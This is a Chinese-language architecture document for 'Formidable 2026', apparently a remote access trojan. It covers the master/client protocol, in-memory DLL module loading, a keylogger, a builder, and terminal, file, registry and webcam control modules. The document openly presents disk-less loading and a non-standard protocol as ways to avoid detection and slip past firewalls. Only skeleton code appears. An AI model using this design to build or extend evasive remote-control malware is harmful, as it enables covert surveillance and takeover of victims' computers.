# Formidable 2026 架构文档

## 目录
- [系统架构概览](#系统架构概览)
- [核心组件](#核心组件)
- [通信协议](#通信协议)
- [模块系统](#模块系统)
- [数据流](#数据流)
- [安全机制](#安全机制)

---

## 系统架构概览

Formidable 2026 采用三层架构设计：

```
┌─────────────────────────────────────────────────────────────────┐
│                         主控端                          │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐       │
│  │ UI Layer │  │ Network  │  │  Core    │  │  Config  │       │
│  │  (GUI)   │──│ Manager  │──│ Handler  │──│  Module  │       │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘       │
└─────────────────────────────────────────────────────────────────┘
                            ↕ TCP/Socket
┌─────────────────────────────────────────────────────────────────┐
│                         被控端                      │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐       │
│  │  Loader  │  │ Network  │  │  Memory  │  │  Module  │       │
│  │ (main)   │──│ Manager  │──│  Loader   │──│  Loader  │       │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘       │
└─────────────────────────────────────────────────────────────────┘
                            ↕ CMD_LOAD_MODULE
┌─────────────────────────────────────────────────────────────────┐
│                         功能模块                        │
│  ┌────────┐  ┌────────┐  ┌────────┐  ┌────────┐              │
│  │Terminal│  │  File  │  │Process │  │ Window │  ...         │
│  │  DLL   │  │  DLL   │  │  DLL   │  │  DLL   │              │
│  └────────┘  └────────┘  └────────┘  └────────┘              │
└─────────────────────────────────────────────────────────────────┘
```

---

## 核心组件

### 1. 主控端

#### 1.1 UI 层 (Master/UI/)
负责所有用户交互界面

```
MainWindow (主窗口)
├── Toolbar (工具栏)
├── ListView (客户端列表)
├── Status Bar (状态栏)
└── Dialogs (对话框)
    ├── TerminalDialog (终端)
    ├── ProcessDialog (进程)
    ├── WindowDialog (窗口)
    ├── DesktopDialog (桌面)
    ├── FileDialog (文件)
    ├── RegistryDialog (注册表)
    ├── AudioDialog (音频)
    ├── VideoDialog (视频)
    ├── ServiceDialog (服务)
    ├── KeylogDialog (键盘记录)
    ├── SettingsDialog (设置)
    └── BuilderDialog (生成器)
```

#### 1.2 网络层 (Master/Network/NetworkManager)
- 基于 HPSocket 的 TCP 服务器
- 管理客户端连接状态
- 处理数据收发

#### 1.3 核心层 (Master/Core/CommandHandler)
- 解析接收到的命令包
- 分发到对应的处理函数
- 更新 UI 状态

#### 1.4 配置层
- 加载/保存服务器配置
- 管理客户端连接参数

### 2. 被控端

#### 2.1 Loader (Client/main.cpp)
- 程序入口点
- 初始化网络连接
- 接收主控端命令
- 动态加载功能模块

#### 2.2 MemoryModule (Common/MemoryModule.c)
- 内存加载 DLL 技术
- 无需写入磁盘
- 支持从资源加载

### 3. 通用模块

#### 3.1 网络协议
- 自定义 TCP 协议封装
- 数据包结构定义
- 客户端/服务器端通用接口

#### 3.2 配置定义
- 命令常量定义
- 数据结构定义
- 默认配置

---

## 通信协议

### 协议层次结构

```
┌─────────────────────────────────────┐
│     Application Layer (Commands)     │
├─────────────────────────────────────┤
│     Custom Protocol Layer (FRMD26?) │
├─────────────────────────────────────┤
│     TCP/Socket Layer                 │
├─────────────────────────────────────┤
│     IP Layer                         │
└─────────────────────────────────────┘
```

### 数据包格式

#### PkgHeader (包头部)
```c
struct PkgHeader {
    char flag[8];       // "FRMD26?" - 协议标识
    int32_t totalLen;   // 整个包长度 (Header + Body)
    int32_t originLen;  // Body 长度
};
```

#### CommandPkg (命令体)
```c
struct CommandPkg {
    uint32_t cmd;       // CommandType (命令类型)
    uint32_t arg1;      // 参数1 (根据命令不同含义不同)
    uint32_t arg2;      // 参数2
    char data[1];       // 变长数据
};
```

### 完整数据包示例

```
┌──────────┬──────────┬──────────┬──────────┬──────────┐
│  Header  │ Command  │   Arg1   │   Arg2   │   Data   │
│  16 bytes│  4 bytes │  4 bytes │  4 bytes │ Variable │
└──────────┴──────────┴──────────┴──────────┴──────────┘
```

---

## 模块系统

### 模块加载流程

```
主控端 (Master)                    被控端
     │                                  │
     │  1. 用户打开对话框                │
     │  (例如: 打开终端)                 │
     │                                  │
     │  2. SendModuleToClient()         │
     │     - 查找 DLL 文件              │
     │     - 读取 DLL 资源              │
     │     - 发送 CMD_LOAD_MODULE       │◄──┐
     │                                  │   │
     │  3. 发送 DLL 数据                │───┼──► 4. 接收模块数据
     │                                  │   │
     │  5. 发送初始化命令                │───┼──► 5. LoadModuleFromMemory()
     │     (例如: CMD_TERMINAL_OPEN)    │   │     - 解析 PE 格式
     │                                  │   │     - 重定位
     │                                  │   │     - 解析导入表
     │                                  │   │     - 调用 DllMain
     │                                  │   │
     │                                  │   │
     │  6. 接收响应数据                  │◄──┼── 6. 模块执行功能
     │     - 终端输出                   │   │     - 调用模块入口函数
     │     - 进程列表                   │   │     - 执行具体操作
     │                                  │   │
     │  7. 更新 UI 显示                 │   │
     │                                  │   │
```

### 模块导出函数

每个功能模块必须实现以下导出函数：

```cpp
extern "C" __declspec(dllexport) void WINAPI ModuleEntry(
    SOCKET s,           // Socket 句柄
    CommandPkg* pkg      // 命令包指针
)
{
    uint32_t cmd = pkg->cmd;
    
    switch(cmd) {
        case CMD_FILE_LIST:
            HandleFileList(s, pkg);
            break;
        case CMD_FILE_DOWNLOAD:
            HandleFileDownload(s, pkg);
            break;
        // ... 其他命令处理
    }
}
```

### 现有模块列表

| 模块名称 | DLL 文件 | 命令范围 | 功能描述 |
|---------|---------|---------|---------|
| Terminal | Terminal.dll | 60-69 | 终端命令执行 |
| FileManager | FileManager.dll | 20-39 | 文件管理操作 |
| ProcessManager | ProcessManager.dll | 40-49 | 进程/模块管理 |
| WindowManager | WindowManager.dll | 50-59 | 窗口/桌面控制 |
| RegistryManager | RegistryManager.dll | 81 | 注册表操作 |
| ServiceManager | ServiceManager.dll | 80,83-85 | 服务管理 |
| Multimedia | Multimedia.dll | 70-73 | 音频/视频流 |
| SystemInfo | SystemInfo.dll | 10 | 系统信息获取 |

---

## 数据流

### 客户端上线流程

```
客户端启动
    │
    ├─→ 1. 读取内置配置
    │     - 主控端 IP/端口
    │     - 加密方式
    │     - 启动方式
    │
    ├─→ 2. 创建 TCP 连接
    │     - 连接主控端
    │     - 等待连接成功
    │
    ├─→ 3. 发送上线信息
    │     CMD_GET_SYSINFO
    │     - OS 版本
    │     - 计算机名
    │     - 用户名
    │     - CPU 信息
    │     - 架构 (x86/x64)
    │
    ├─→ 4. 启动心跳线程
    │     - 每 30 秒发送一次
    │     CMD_HEARTBEAT
    │     - 计算往返时间 (RTT)
    │
    └─→ 5. 等待主控端命令
```

### 主控端处理流程

```
HPSocket 接收数据
    │
    ├─→ 1. OnReceive 回调
    │     - 接收原始数据
    │     - 追加到接收缓冲区
    │
    ├─→ 2. 解析数据包
    │     - 检查 PkgHeader.flag = "FRMD26?"
    │     - 验证 totalLen 和 originLen
    │     - 提取 CommandPkg
    │
    ├─→ 3. CommandHandler::HandlePacket()
    │     - 根据 pkg->cmd 分发
    │
    └─→ 4. 具体命令处理
         ├─ HandleClientInfo() → 更新客户端列表
         ├─ HandleHeartbeat() → 更新 RTT 状态
         ├─ HandleProcessList() → 更新进程列表 UI
         ├─ HandleTerminalData() → 显示终端输出
         ├─ HandleFileData() → 处理文件传输
         └─ ... (其他命令)
```

### 模块加载详细流程

```
用户点击 "终端" 按钮
    │
    ├─→ 1. TerminalDialog::Show()
    │     - 创建对话框窗口
    │     - WM_INITDIALOG
    │
    ├─→ 2. 发送 CMD_LOAD_MODULE
    │     NetworkManager::SendModule(
    │         clientId,
    │         CMD_LOAD_MODULE,
    │         L"Terminal.dll"
    │     )
    │
    ├─→ 3. 查找 DLL
    │     if (文件存在) {
    │         读取文件到内存
    │     } else {
    │         从资源读取 (IDR_MODULE_TERMINAL)
    │     }
    │
    ├─→ 4. 发送 DLL 数据
    │     PkgHeader + CommandPkg + DLL_Data
    │
    ├─→ 5. 客户端接收
    │     Client::LoadModuleFromMemory()
    │     - MemoryLoadLibrary()
    │     - MemoryGetProcAddress(ModuleEntry)
    │
    ├─→ 6. 发送初始化命令
    │     CMD_TERMINAL_OPEN
    │     - 创建 CMD 进程
    │     - 创建匿名管道
    │
    └─→ 7. 接收终端输出
         CMD_TERMINAL_DATA
         - 更新 Edit 控件
```

---

## 安全机制

### 1. 内存加载技术
- DLL 不写入磁盘
- 完全在内存中执行
- 减少被检测风险

### 2. 自定义协议
- 非标准 HTTP/HTTPS
- 难以被防火墙识别
- 支持加密传输

### 3. 模块化架构
- 核心功能最小化
- 功能按需加载
- 减小程序体积

### 4. 跨平台兼容
- Win32/x64 混合控制
- 统一通信接口
- 自动架构适配

---

## 扩展开发

### 添加新功能模块

1. **创建 DLL 工程**
   - 在 `Modules/` 目录下创建新文件夹
   - 添加 Visual Studio 项目文件

2. **实现模块入口函数**
   ```cpp
   extern "C" __declspec(dllexport) void WINAPI ModuleEntry(
       SOCKET s, CommandPkg* pkg
   ) {
       // 处理命令
   }
   ```

3. **定义命令常量**
   - 在 `Common/Config.h` 中添加新的 CommandType
   - 确保命令编号不冲突

4. **添加资源**
   - 在 `Master/res/` 添加图标
   - 在 `Master/MasterGUI.rc` 添加资源引用

5. **实现主控端 UI**
   - 在 `Master/UI/` 创建对话框类
   - 集成到 `MainWindow.cpp` 菜单

6. **测试**
   - 编译 DLL
   - 添加到项目资源
   - 测试加载和功能

---

## 编码规范

### 文件编码
- 所有源文件使用 `UTF-8 with BOM` 编码
- 确保中文字符正确显示

### 头文件包含顺序
```cpp
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <windows.h>
#include <system_headers...>

#include "local_headers.h"
```

### 命名规范
- 类名: `PascalCase` (如: `TerminalDialog`)
- 函数名: `PascalCase` (如: `HandleProcessList`)
- 变量名: `camelCase` (如: `clientId`)
- 常量: `UPPER_CASE` (如: `CMD_TERMINAL_OPEN`)
- 宏定义: `UPPER_CASE` (如: `WIN32_LEAN_AND_MEAN`)

### 注释规范
- 文件头注释: 说明文件用途、编码格式
- 函数注释: 说明功能、参数、返回值
- 复杂逻辑: 添加行内注释说明

---

## 性能优化

### 1. 内存管理
- 使用智能指针 (`std::shared_ptr`, `std::unique_ptr`)
- 避免内存泄漏
- 及时释放资源

### 2. 网络优化
- 使用异步 I/O (HPSocket)
- 批量发送数据
- 减少网络往返

### 3. UI 优化
- 使用 `WM_SETREDRAW` 控制 ListView 重绘
- 虚拟列表支持大数据量
- 后台线程处理耗时操作

---

## 故障排查

### 常见问题

1. **模块加载失败**
   - 检查 DLL 文件是否存在
   - 验证资源 ID 是否正确
   - 检查依赖项是否满足

2. **连接断开**
   - 检查防火墙设置
   - 验证网络连通性
   - 查看心跳日志

3. **UI 无响应**
   - 检查是否在主线程执行耗时操作
   - 使用后台线程处理
   - 定期调用消息泵

4. **编码错误**
   - 确保所有文件使用 UTF-8 BOM
   - 检查字符集设置
   - 验证编译器设置

---

## 版本历史

### v2026.1.0 (当前版本)
- 模块化架构重构
- 支持 Win32/x64 混合控制
- 内存加载模块技术
- 完整的功能模块实现

---

## 参考资料

- [HPSocket 文档](https://github.com/ldcsaa/HP-Socket)
- [MemoryModule 技术](https://github.com/fancycode/MemoryModule)
- [Windows API 文档](https://docs.microsoft.com/en-us/windows/win32/api/)

---

**Formidable 2026 - 架构文档**
